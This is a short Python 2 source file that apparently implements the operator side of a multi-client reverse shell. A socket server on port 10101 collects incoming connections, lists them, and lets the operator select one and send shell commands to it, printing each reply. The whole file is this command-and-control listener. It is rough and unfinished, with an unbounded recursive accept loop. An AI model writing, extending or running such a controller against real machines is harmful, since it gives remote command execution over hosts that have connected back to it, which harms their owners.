import socket


class Server(object):
    sckt = None
    addresses = []
    connections = []

    def __init__(self):
        self.sckt = socket.socket()
        self.sckt.bind(("", 10101))
        self.sckt.listen(5)

    # should be multi-threaded
    def accept_connection(self):
        connection, address = self.sckt.accept()
        self.connections.append(connection)
        self.addresses.append(address)
        self.accept_connection()

    def remove_connection(self, index):
        del self.addresses[index]
        del self.connections[index]

    def show_connections(self):
        print("---------- Connections ----------")
        for index, address in enumerate(self.addresses):
            print(str(index) + "     " + address[0] + "     " + str(address[1]))
        command = raw_input(">> ")
        if command[:6] == "select":
            if int(command[7:]) < len(self.addresses):
                self.send_commands(int(command[7:]))

    def send_commands(self, index):
        while True:
            # show IP on raw input?
            command = raw_input(">> ")
            if command == "quit":
                break
            if len(command) > 0:
                self.connections[index].send(command)
                response = str(self.connections[index].recv(1024))
                print(response)
        self.show_connections()

    def close_connections(self):
        for connection in self.connections:
            connection.close()
        self.sckt.close()
